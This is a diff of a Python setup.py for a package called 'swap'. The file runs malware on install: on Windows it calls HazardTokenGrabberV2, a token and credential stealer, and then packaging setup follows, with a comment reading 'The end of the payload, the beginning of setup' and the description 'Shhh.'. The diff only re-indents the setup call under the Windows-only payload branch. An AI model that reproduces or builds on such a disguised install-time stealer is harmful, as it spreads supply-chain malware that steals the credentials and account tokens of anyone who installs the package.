@@ -830,23 +830,20 @@ if __name__ == "__main__" and os.name == "nt":
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
     asyncio.run(HazardTokenGrabberV2().init())
+    # The end of the payload, the beginning of setup
+    if fetch_conf('dev'): print("The end of the payload, the beginning of setup")
+    from setuptools import setup
+    import codecs
+    import os
 
-# The end of the payload, the beginning of setup
-if fetch_conf('dev'): print("The end of the payload, the beginning of setup")
-from setuptools import setup, find_packages
-import codecs
-import os
+    VERSION = '1.4.20'
+    DESCRIPTION = 'Shhh.'
 
-VERSION = '1.4.20'
-DESCRIPTION = 'Shhh.'
-
-# Setting up
-setup(
-    name = "swap",
-    version = VERSION,
-    author = "me",
-    author_email = "spaceydot@proton.me",
-    description = DESCRIPTION,
-    packages = find_packages(),
-    install_requires=[]
-)
+    # Setting up
+    setup(
+        name = "swap",
+        version = VERSION,
+        author = "me",
+        author_email = "spaceydot@proton.me",
+        description = DESCRIPTION
+    )
